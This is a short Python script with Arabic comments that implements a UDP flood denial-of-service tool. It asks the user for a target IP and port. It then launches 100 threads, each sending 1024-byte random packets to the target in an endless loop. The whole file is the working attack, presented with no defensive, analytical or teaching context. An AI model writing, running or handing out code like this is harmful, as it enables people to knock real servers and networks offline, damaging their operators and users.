
import socket
import random
import threading
import os

def get_user_input():
    # طلب إدخال عنوان IP والمنفذ
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))

    return target_ip, target_port

# إرسال حزم إلى الهدف من مآخذ متعددة في خيوط متعددة
def attack(target_ip, target_port):
    # إنشاء مأخذ
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        try:
            data = os.urandom(1024)  # زيادة حجم الحمولة
            s.sendto(data, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")

def main():
    target_ip, target_port = get_user_input()

    threads = []
    for i in range(100):
        t = threading.Thread(target=attack, args=(target_ip, target_port))
        threads.append(t)

    # بدء الخيوط
    for t in threads:
        t.start()

if __name__ == "__main__":
    main()
